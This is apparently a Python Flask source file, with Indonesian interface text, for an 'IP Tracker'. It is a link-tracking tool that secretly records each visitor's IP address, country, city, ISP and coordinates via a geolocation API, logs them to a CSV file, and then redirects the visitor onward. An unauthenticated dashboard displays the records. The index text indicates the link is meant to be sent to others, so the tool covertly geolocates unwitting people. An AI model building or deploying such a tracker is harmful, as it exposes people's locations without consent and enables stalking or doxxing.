from flask import Flask, request, redirect, jsonify, render_template_string
import requests
import os
import csv
from datetime import datetime

app = Flask(__name__)
LOG_FILE = "logs.csv"

def get_ip_info(ip):
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}")
        return response.json()
    except:
        return {"status": "fail"}

def log_access(data):
    file_exists = os.path.isfile(LOG_FILE)
    with open(LOG_FILE, mode="a", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        if not file_exists:
            writer.writerow(["timestamp", "ip", "country", "city", "isp", "latitude", "longitude"])
        writer.writerow(data)

@app.route("/")
def index():
    return "Selamat datang di IP Tracker! Akses link yang dikirimkan ke kamu."

@app.route("/go")
def track_and_redirect():
    target_url = request.args.get('url')
    if not target_url:
        return "Link target tidak ditemukan!", 400
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    info = get_ip_info(ip)
    row = [
        datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        ip,
        info.get("country", ""),
        info.get("city", ""),
        info.get("isp", ""),
        info.get("lat", ""),
        info.get("lon", "")
    ]
    log_access(row)
    return redirect(target_url)

@app.route("/dashboard")
def dashboard():
    if not os.path.exists(LOG_FILE):
        return "Belum ada data yang tercatat."
    
    with open(LOG_FILE, "r", encoding="utf-8") as f:
        reader = csv.reader(f)
        data = list(reader)

    # Tambahkan nomor urut pada setiap data
    for i, row in enumerate(data[1:], 1):  # Mulai dari 1 untuk nomor urut
        row.insert(0, i)  # Menambahkan nomor urut di depan setiap baris data
    
    html_template = '''
    <h2>Dashboard IP Tracker</h2>
    <table border="1" cellpadding="5" cellspacing="0">
        <tr>
            <th>No.</th>  <!-- Kolom untuk nomor urut -->
            {% for header in data[0] %}
            <th>{{ header }}</th>
            {% endfor %}
        </tr>
        {% for row in data[1:] %}
        <tr>
            {% for cell in row %}
            <td>{{ cell }}</td>
            {% endfor %}
        </tr>
        {% endfor %}
    </table>
    <p>Total akses: {{ data|length - 1 }}</p>
    '''
    return render_template_string(html_template, data=data)



if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(debug=False, host='0.0.0.0', port=port)

